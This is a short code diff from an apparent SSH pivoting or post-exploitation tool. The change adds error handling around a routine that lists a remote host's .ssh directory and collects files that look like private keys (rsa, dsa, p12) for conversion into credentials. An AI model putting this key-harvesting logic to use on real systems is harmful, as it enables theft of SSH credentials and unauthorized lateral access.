@@ -256,14 +256,18 @@ class BaboosshExt(object,metaclass=ExtStr):
         files = []
         ret = []
         chan = self.connection.transport.open_channel("session",timeout=3)
-        filelist = self.sftp.listdir_attr(".ssh")
-        for file in filelist:
-            if file.st_size == 0:
-                continue
-            if "rsa" in file.filename or "key" in file.filename or "p12" in file.filename or "dsa" in file.filename:
-                files.append(file.filename)
-        for keyfile in files:
-            c = self.getKeyToCreds(keyfile)
+        try:
+            filelist = self.sftp.listdir_attr(".ssh")
+            for file in filelist:
+                if file.st_size == 0:
+                    continue
+                if "rsa" in file.filename or "key" in file.filename or "p12" in file.filename or "dsa" in file.filename:
+                    files.append(file.filename)
+            for keyfile in files:
+                c = self.getKeyToCreds(keyfile)
+        except FileNotFoundError:
+            # TODO : log somehow the failure
+            pass
 
     def getKeyToCreds(self,keyfile,basePath=".ssh"):
         if basePath != ".":
